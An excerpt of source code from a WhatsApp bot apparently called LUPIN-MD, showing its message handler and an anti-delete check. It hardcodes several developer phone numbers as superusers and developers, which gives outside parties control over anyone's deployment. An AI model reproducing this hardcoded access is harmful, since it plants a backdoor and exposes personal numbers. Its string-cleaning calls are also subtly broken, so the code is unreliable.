...
var session = conf.session.replace(/LUPIN-MD-WA-BOT;;;=>/g,"");
...
setTimeout(() => {
    async function main() {
        ...
        zk.ev.on("messages.upsert", async (m) => {
            ...
            /* const BrashoKish='254735905972';
             const BrashoKish1='254745936840';
             const BrashoKish2='254735905972'*/
            /*  var superUser=[servBot,BrashoKish,BrashoKish1,luffy].map((s)=>s.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);
              var dev =[BrashoKish,BrashoKish1,BrashoKish2].map((t)=>t.replace(/[^0-9]/g)+"@s.whatsapp.net").includes(auteurMessage);*/
            ...
            const BrashoKish = '25473590592';
            const BrashoKish1 = '254745936840';
            const BrashoKish2 = "254735905972";
            const BrashoKish3 = '254745936840';
            const sudo = await getAllSudoNumbers();
            const superUserNumbers = [servBot, BrashoKish, BrashoKish1, BrashoKish2, BrashoKish3, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
            const allAllowedNumbers = superUserNumbers.concat(sudo);
            const superUser = allAllowedNumbers.includes(auteurMessage);
            
            var dev = [BrashoKish, BrashoKish1,BrashoKish2,BrashoKish3].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
            function repondre(mes) { zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); }
            console.log("\t [][]...{LUPIN-MD}...[][]");
            ...
            var verifZokAdmin = verifGroupe ? admins.includes(idBot) : false;
             ...
             if(superUser || verifAdmin || !verifZokAdmin  ) { console.log('je fais rien'); return};
                                   ...
                                   // txt += `message supprimé \n @${auteurMessage.split("@")[0]} rétiré du groupe.`;
                                    const gifLink = "https://raw.githubusercontent.com/djalega8000/Lupin-MD/main/media/remover.gif";
